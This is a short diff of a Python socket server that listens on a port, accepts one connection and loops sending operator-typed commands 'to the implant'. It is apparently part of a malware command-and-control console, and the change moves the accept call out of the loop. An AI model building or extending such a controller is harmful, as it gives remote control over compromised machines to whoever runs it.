@@ -7,8 +7,8 @@ port = 12345  # Reserve a port for your service
 s.bind((host, port))  # Bind to the port
 
 s.listen(5)  # Now wait for client connection
-while True:
-    c, addr = s.accept()  # Establish connection with client
+c, addr = s.accept()
+while True:  # Establish connection with client
     print(f"Connection from {addr} has been established.")
     message = input("Enter command to the implant")
     if message == "exit":
